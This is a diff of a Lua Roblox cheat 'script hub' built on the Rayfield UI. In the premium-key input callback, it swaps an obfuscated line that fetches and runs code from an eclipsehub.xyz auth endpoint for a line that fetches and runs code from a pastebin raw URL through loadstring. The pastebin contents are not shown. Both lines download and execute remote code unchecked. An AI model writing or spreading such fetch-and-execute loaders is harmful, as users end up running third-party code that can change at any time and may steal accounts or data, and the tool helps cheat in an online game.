@@ -39,7 +39,7 @@ local Window = Rayfield:CreateWindow({
  local ScriptsTab = Window:CreateTab("Scripts", "scroll") -- Title, Image
  local MiscTab = Window:CreateTab("Misc", "settings") -- Title, Image
  local UniversalScripts = ScriptsTab:CreateSection("Universal")
- 
+
 local unloadButton = MiscTab:CreateButton({
    Name = "Unload Hub",
    Callback = function()
@@ -55,8 +55,7 @@ local premEclipse = MiscTab:CreateInput({
    Flag = "Input1",
    Callback = function(Text)
       getgenv().mainKey = Text
-
-      local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https\58//api.eclipsehub.xyz/auth";c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
+      loadstring(game:HttpGet("https://pastebin.com/raw/avs78BWz"))()
    end,
 })
 
